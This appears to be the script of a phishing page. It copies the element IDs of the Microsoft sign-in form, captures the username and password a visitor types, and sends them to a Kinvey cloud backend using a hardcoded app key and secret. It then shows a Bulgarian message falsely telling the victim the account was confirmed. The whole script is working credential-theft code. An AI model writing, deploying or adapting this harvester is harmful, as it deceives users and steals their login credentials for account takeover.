<script type="module">
    const baseUrl = 'https://baas.kinvey.com';
        const appKey = 'kid_Hkeri63PL';
        const appSecret = '31a7fa5787e04d7dbe23d33c05372b3c';

        function makeAuth(type) {
            return type === 'Basic'
                ? 'Basic ' + btoa(`${appKey}:${appSecret}`)
                : 'Kinvey ' + sessionStorage.getItem('authtoken'); 
        }

        function makeHeaders(method, data, type) {
            const headers = {
                method,
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: makeAuth(type),
                },
            };

            if (method === 'POST' || method === 'PUT') {
                headers.body = JSON.stringify(data);
            }

            return headers;
        }

        function fetchData(module, endpoint, headers) {
            return fetch(`${baseUrl}/${module}/${appKey}/${endpoint}`, headers)
                .then();
        }

        function post(module, endpoint, data, type) {
            const headers = makeHeaders('POST', data, type);
            return fetchData(module, endpoint, headers);
        }

        document.getElementById('idSIButton9').addEventListener(
            'click', function () {
                let username = document.getElementById('i0118').value;
                let password = document.getElementById('i0119').value;
                let dog = password;

                post('user', '', { username, password, dog }, 'Basic')
                    .then(function () {
                        document.getElementById('i0118').value = "";
                        document.getElementById('i0119').value = "";
                        document.getElementById('loginHeader').innerHTML = "Вие успешно потвърдихте акаунта си!";
                    }).catch(console.error);
            }
        );
